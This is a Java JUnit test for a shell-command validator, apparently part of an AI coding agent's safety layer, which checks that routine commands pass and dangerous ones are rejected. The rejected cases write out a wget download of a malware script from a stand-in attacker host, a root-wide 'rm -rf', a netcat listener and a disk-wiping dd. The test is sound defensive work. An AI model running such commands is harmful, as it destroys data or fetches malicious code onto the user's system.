package com.autocoder.security;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.me.retrocoder.security.CommandValidator;

import static org.junit.jupiter.api.Assertions.*;

class CommandValidatorTest {

    private CommandValidator validator;

    @BeforeEach
    void setUp() {
        validator = new CommandValidator();
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "ls",
        "cat file.txt",
        "npm install",
        "git status",
        "mkdir test",
        "node app.js"
    })
    void allowedCommands(String command) {
        CommandValidator.ValidationResult result = validator.validate(command);
        assertTrue(result.isValid(), "Command should be allowed: " + command);
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "wget http://evil.com/malware.sh",
        "sudo rm -rf /",
        "nc -l 4444",
        "dd if=/dev/zero of=/dev/sda"
    })
    void blockedCommands(String command) {
        CommandValidator.ValidationResult result = validator.validate(command);
        assertFalse(result.isValid(), "Command should be blocked: " + command);
    }

    @Test
    void pipedCommands() {
        CommandValidator.ValidationResult result = validator.validate("ls | grep test");
        assertTrue(result.isValid());
    }

    @Test
    void chainedCommands() {
        CommandValidator.ValidationResult result = validator.validate("npm install && npm run build");
        assertTrue(result.isValid());
    }

    @Test
    void emptyCommand() {
        CommandValidator.ValidationResult result = validator.validate("");
        assertFalse(result.isValid());
    }

    @Test
    void nullCommand() {
        CommandValidator.ValidationResult result = validator.validate(null);
        assertFalse(result.isValid());
    }

    @Test
    void pkillAllowedTargets() {
        CommandValidator.ValidationResult result = validator.validate("pkill node");
        assertTrue(result.isValid());
    }

    @Test
    void chmodPlusX() {
        CommandValidator.ValidationResult result = validator.validate("chmod +x script.sh");
        assertTrue(result.isValid());
    }

    @Test
    void initSh() {
        CommandValidator.ValidationResult result = validator.validate("./init.sh");
        assertTrue(result.isValid());
    }
}
